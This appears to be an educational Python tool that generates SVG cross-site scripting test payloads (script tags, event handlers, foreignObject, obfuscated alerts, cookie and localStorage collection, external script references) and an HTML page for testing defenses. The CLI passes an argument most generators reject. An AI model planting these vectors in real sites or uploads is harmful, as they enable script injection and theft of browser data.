#!/usr/bin/env python3
"""
SVG Payload Generator - Educational Tool

This script generates synthetic SVG payloads for educational testing of security defenses.
All payloads are designed for learning purposes and are safe for educational environments.

⚠️ WARNING: This tool is for educational purposes only. Use responsibly.

Author: SVG Security Lab
License: MIT
"""

import random
import base64
import re
import argparse
import json
from pathlib import Path
from typing import List, Dict, Optional

class SVGPayloadGenerator:
    """Generator for synthetic SVG payloads for educational testing."""
    
    def __init__(self):
        self.payload_types = {
            'basic_xss': {
                'name': 'Basic XSS Attack',
                'description': 'Simple script injection via SVG script tags',
                'severity': 'HIGH'
            },
            'event_handler': {
                'name': 'Event Handler Attack',
                'description': 'JavaScript execution via event handlers',
                'severity': 'HIGH'
            },
            'foreign_object': {
                'name': 'Foreign Object Attack',
                'description': 'Script injection via foreignObject element',
                'severity': 'HIGH'
            },
            'obfuscated': {
                'name': 'Obfuscated Attack',
                'description': 'Hidden malicious code using obfuscation',
                'severity': 'MEDIUM'
            },
            'data_exfiltration': {
                'name': 'Data Exfiltration',
                'description': 'Attempts to steal browser data',
                'severity': 'HIGH'
            },
            'external_reference': {
                'name': 'External Reference',
                'description': 'References external malicious content',
                'severity': 'MEDIUM'
            }
        }
    
    def generate_basic_xss(self, message: str = "Educational XSS Demo") -> str:
        """Generate a basic XSS payload."""
        return f'''<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="100" height="100" fill="red" x="50" y="50"/>
  <circle cx="100" cy="100" r="30" fill="blue"/>
  <text x="100" y="120" text-anchor="middle" fill="white">SVG</text>
  <script>
    console.log('EDUCATIONAL DEMO: Basic XSS executed');
    alert('{message}');
  </script>
</svg>'''
    
    def generate_event_handler(self, event: str = "onload") -> str:
        """Generate an event handler payload."""
        return f'''<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="100" height="100" fill="green" x="50" y="50" 
        {event}="console.log('EDUCATIONAL DEMO: Event handler executed'); alert('Event Handler Demo');"/>
  <text x="100" y="120" text-anchor="middle" fill="white">Event Demo</text>
</svg>'''
    
    def generate_foreign_object(self) -> str:
        """Generate a foreign object payload."""
        return '''<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="100" height="100" fill="purple" x="50" y="50"/>
  <foreignObject width="0" height="0">
    <div xmlns="http://www.w3.org/1999/xhtml">
      <script>
        console.log('EDUCATIONAL DEMO: Foreign object script executed');
        alert('Foreign Object Demo');
      </script>
    </div>
  </foreignObject>
  <text x="100" y="120" text-anchor="middle" fill="white">Foreign Object</text>
</svg>'''
    
    def generate_obfuscated(self) -> str:
        """Generate an obfuscated payload."""
        # Create obfuscated strings
        alert_msg = base64.b64encode("Educational Obfuscated Demo".encode()).decode()
        cmd_parts = ['al', 'ert']
        msg_parts = ['Edu', 'cational', ' ', 'Demo']
        
        return f'''<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="100" height="100" fill="orange" x="50" y="50"/>
  <script>
    // Obfuscated payload for educational purposes
    var _0x1a2b = '{alert_msg}';
    var _0x3c4d = '{cmd_parts[0]}' + '{cmd_parts[1]}';
    var _0x5e6f = '{msg_parts[0]}' + '{msg_parts[1]}' + '{msg_parts[2]}' + '{msg_parts[3]}';
    
    console.log('EDUCATIONAL DEMO: Obfuscated payload executed');
    window[_0x3c4d](atob(_0x1a2b));
  </script>
  <text x="100" y="120" text-anchor="middle" fill="white">Obfuscated</text>
</svg>'''
    
    def generate_data_exfiltration(self) -> str:
        """Generate a data exfiltration payload."""
        return '''<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="100" height="100" fill="brown" x="50" y="50"/>
  <script>
    // Educational data exfiltration simulation
    console.log('EDUCATIONAL DEMO: Data exfiltration simulation started');
    
    var educationalData = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      cookies: document.cookie || 'No cookies',
      localStorage: (function() {
        var items = {};
        for (var i = 0; i < localStorage.length; i++) {
          var key = localStorage.key(i);
          items[key] = localStorage.getItem(key);
        }
        return items;
      })(),
      demoType: 'Data Exfiltration Simulation'
    };
    
    console.log('EDUCATIONAL DEMO: Collected data (synthetic):', educationalData);
    alert('Data Exfiltration Demo - Check console for details');
  </script>
  <text x="100" y="120" text-anchor="middle" fill="white">Data Exfil</text>
</svg>'''
    
    def generate_external_reference(self) -> str:
        """Generate an external reference payload."""
        return '''<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="100" height="100" fill="pink" x="50" y="50"/>
  <script href="http://example.com/educational-demo.js"/>
  <use href="#educational-demo"/>
  <defs>
    <script id="educational-demo">
      console.log('EDUCATIONAL DEMO: External reference executed');
      alert('External Reference Demo');
    </script>
  </defs>
  <text x="100" y="120" text-anchor="middle" fill="white">External Ref</text>
</svg>'''
    
    def generate_safe_svg(self) -> str:
        """Generate a safe SVG for comparison."""
        return '''<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="100" height="100" fill="lightblue" x="50" y="50"/>
  <circle cx="100" cy="100" r="30" fill="darkblue"/>
  <text x="100" y="120" text-anchor="middle" fill="white">Safe SVG</text>
</svg>'''
    
    def generate_payload(self, payload_type: str, **kwargs) -> Dict:
        """Generate a specific type of payload."""
        if payload_type not in self.payload_types:
            raise ValueError(f"Unknown payload type: {payload_type}")
        
        generator_methods = {
            'basic_xss': self.generate_basic_xss,
            'event_handler': self.generate_event_handler,
            'foreign_object': self.generate_foreign_object,
            'obfuscated': self.generate_obfuscated,
            'data_exfiltration': self.generate_data_exfiltration,
            'external_reference': self.generate_external_reference
        }
        
        method = generator_methods[payload_type]
        svg_content = method(**kwargs)
        
        return {
            'type': payload_type,
            'name': self.payload_types[payload_type]['name'],
            'description': self.payload_types[payload_type]['description'],
            'severity': self.payload_types[payload_type]['severity'],
            'svg': svg_content,
            'educational_note': 'This is a synthetic payload for educational purposes only.'
        }
    
    def generate_all_payloads(self) -> List[Dict]:
        """Generate all types of payloads."""
        payloads = []
        
        for payload_type in self.payload_types.keys():
            try:
                payload = self.generate_payload(payload_type)
                payloads.append(payload)
            except Exception as e:
                print(f"Error generating {payload_type}: {e}")
        
        # Add safe SVG for comparison
        payloads.append({
            'type': 'safe_svg',
            'name': 'Safe SVG',
            'description': 'Safe SVG for comparison testing',
            'severity': 'NONE',
            'svg': self.generate_safe_svg(),
            'educational_note': 'This is a safe SVG for comparison with malicious payloads.'
        })
        
        return payloads
    
    def save_payloads(self, payloads: List[Dict], output_dir: str = "generated_payloads"):
        """Save payloads to files."""
        output_path = Path(output_dir)
        output_path.mkdir(exist_ok=True)
        
        # Save individual files
        for payload in payloads:
            filename = f"{payload['type']}.svg"
            filepath = output_path / filename
            
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(payload['svg'])
            
            print(f"Saved: {filepath}")
        
        # Save metadata
        metadata = {
            'generator': 'SVG Security Lab - Educational Payload Generator',
            'warning': 'All payloads are synthetic and for educational purposes only',
            'payloads': payloads
        }
        
        metadata_path = output_path / "metadata.json"
        with open(metadata_path, 'w', encoding='utf-8') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Saved metadata: {metadata_path}")
    
    def generate_test_suite(self, output_dir: str = "test_suite"):
        """Generate a complete test suite."""
        output_path = Path(output_dir)
        output_path.mkdir(exist_ok=True)
        
        # Generate all payloads
        payloads = self.generate_all_payloads()
        
        # Create test HTML file
        test_html = self._generate_test_html(payloads)
        
        with open(output_path / "test_suite.html", 'w', encoding='utf-8') as f:
            f.write(test_html)
        
        # Save individual payloads
        payloads_dir = output_path / "payloads"
        payloads_dir.mkdir(exist_ok=True)
        
        for payload in payloads:
            if payload['type'] != 'safe_svg':
                filename = f"{payload['type']}.svg"
                filepath = payloads_dir / filename
                
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(payload['svg'])
        
        print(f"Test suite generated in: {output_path}")
    
    def _generate_test_html(self, payloads: List[Dict]) -> str:
        """Generate HTML test page for payloads."""
        html = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SVG Payload Test Suite - Educational</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .payload { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 5px; }
        .payload.vulnerable { border-left: 5px solid #e74c3c; }
        .payload.safe { border-left: 5px solid #27ae60; }
        .svg-container { border: 1px solid #ccc; padding: 10px; margin: 10px 0; background: #f9f9f9; }
        .code { background: #f4f4f4; padding: 10px; border-radius: 3px; font-family: monospace; font-size: 12px; overflow-x: auto; }
        button { background: #3498db; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; }
        button:hover { background: #2980b9; }
        .severity { padding: 3px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; }
        .severity.HIGH { background: #e74c3c; color: white; }
        .severity.MEDIUM { background: #f39c12; color: white; }
        .severity.NONE { background: #27ae60; color: white; }
    </style>
</head>
<body>
    <div class="warning">
        <h2>⚠️ EDUCATIONAL TEST SUITE</h2>
        <p><strong>Warning:</strong> This page contains synthetic SVG payloads for educational testing only. 
        These payloads demonstrate security vulnerabilities and should only be used in controlled, educational environments.</p>
    </div>
    
    <h1>SVG Payload Test Suite</h1>
    <p>This test suite contains various SVG payloads for testing security defenses.</p>
    
    <div id="payloads">
'''
        
        for payload in payloads:
            severity_class = payload['severity']
            payload_class = 'safe' if payload['type'] == 'safe_svg' else 'vulnerable'
            
            html += f'''
        <div class="payload {payload_class}">
            <h3>{payload['name']} <span class="severity {severity_class}">{severity_class}</span></h3>
            <p><strong>Description:</strong> {payload['description']}</p>
            <p><strong>Educational Note:</strong> {payload['educational_note']}</p>
            
            <button onclick="loadPayload('{payload['type']}')">Load Payload</button>
            <button onclick="showCode('{payload['type']}')">Show Code</button>
            
            <div id="svg-{payload['type']}" class="svg-container">
                <p>Click "Load Payload" to display the SVG</p>
            </div>
            
            <div id="code-{payload['type']}" class="code" style="display: none;">
                <pre>{payload['svg'].replace('<', '&lt;').replace('>', '&gt;')}</pre>
            </div>
        </div>
'''
        
        html += '''
    </div>
    
    <script>
        function loadPayload(type) {
            const container = document.getElementById('svg-' + type);
            const payloads = ''' + json.dumps(payloads) + ''';
            
            const payload = payloads.find(p => p.type === type);
            if (payload) {
                container.innerHTML = payload.svg;
                console.log('EDUCATIONAL DEMO: Loaded payload:', type);
            }
        }
        
        function showCode(type) {
            const codeDiv = document.getElementById('code-' + type);
            codeDiv.style.display = codeDiv.style.display === 'none' ? 'block' : 'none';
        }
        
        console.log('EDUCATIONAL DEMO: SVG Payload Test Suite Loaded');
        console.log('⚠️ WARNING: This is an educational test environment');
    </script>
</body>
</html>'''
        
        return html

def main():
    """Main function for command-line usage."""
    parser = argparse.ArgumentParser(
        description="SVG Payload Generator - Educational Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python payload-generator.py --type basic_xss
  python payload-generator.py --all --output payloads/
  python payload-generator.py --test-suite
        """
    )
    
    parser.add_argument('--type', choices=['basic_xss', 'event_handler', 'foreign_object', 'obfuscated', 'data_exfiltration', 'external_reference'],
                       help='Generate specific payload type')
    parser.add_argument('--all', action='store_true', help='Generate all payload types')
    parser.add_argument('--test-suite', action='store_true', help='Generate complete test suite')
    parser.add_argument('--output', default='generated_payloads', help='Output directory')
    parser.add_argument('--message', default='Educational XSS Demo', help='Custom message for basic XSS payload')
    
    args = parser.parse_args()
    
    generator = SVGPayloadGenerator()
    
    try:
        if args.type:
            # Generate specific payload
            payload = generator.generate_payload(args.type, message=args.message)
            print(f"Generated {payload['name']}:")
            print(f"Severity: {payload['severity']}")
            print(f"Description: {payload['description']}")
            print(f"SVG Content:\n{payload['svg']}")
            
        elif args.all:
            # Generate all payloads
            payloads = generator.generate_all_payloads()
            generator.save_payloads(payloads, args.output)
            print(f"\nGenerated {len(payloads)} payloads in {args.output}/")
            
        elif args.test_suite:
            # Generate test suite
            generator.generate_test_suite(args.output)
            print(f"\nTest suite generated in {args.output}/")
            
        else:
            parser.print_help()
            
    except Exception as e:
        print(f"Error: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    exit(main())
